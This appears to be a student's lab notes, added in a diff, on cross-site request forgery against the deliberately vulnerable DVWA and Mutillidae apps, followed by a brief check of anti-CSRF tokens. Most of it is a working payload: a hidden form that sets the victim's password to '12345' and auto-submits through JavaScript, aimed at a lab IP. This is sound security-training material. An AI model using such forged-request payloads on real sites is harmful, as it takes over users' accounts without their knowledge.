@@ -1,0 +1,55 @@
+CSRF: (cross site request forgery)
+ CSRF is an attack that forces an end user to execute
+unwanted actions on a web application in which they are currently
+authenticated.
+
+>CSRF can be GET based and POST based.
+
+1.
+DVWA-CSRF-LOW:
+>Copy the form section and make a html file and save there
+>see the file on firefox,you are going to see the same form.
+>give the URl of DVWA in action
+>change the password now
+
+2.(form code)
+<form action="#" method="GET">    New password:<br>
+    <input type="password" autocomplete="off" name="password_new"><br>
+    Confirm new password: <br>
+    <input type="password" autocomplete="off" name="password_conf">
+    <br>
+    <input type="submit" value="Change" name="Change">
+</form>
+
+
+3.(editing the code to make page invisible for target)
+
+<form id=form1 action="http://192.168.50.8/dvwa/vulnerabilities/csrf/" method="GET">    
+    <input type="hidden" autocomplete="off" name="password_new" value="12345"><br>
+    <input type="hidden" autocomplete="off" name="password_conf" value="12345">
+    <input value="change" name="Change" type="hidden">
+</form>
+
+4.(Adding java script code to automatically change the password on one click)
+
+<form id=form1 action="http://192.168.50.8/dvwa/vulnerabilities/csrf/" method="GET">    
+    <input type="hidden" autocomplete="off" name="password_new" value="12345"><br>
+    <input type="hidden" autocomplete="off" name="password_conf" value="12345">
+    <input value="change" name="Change" type="hidden">
+</form>
+
+<script>document.getElementById('form1').submit();</script>
+
+
+
+
+To Check the Prevention Token:
+
+Mutillidae:
+
+>go to owasp Top 10 >CSRF >Add to your blog
+>Increase the security level to 5
+>Inspect the code and see the Token:
+>Refresh the page and check there we get different
+ token.
+   >>The token should be long,random and unique
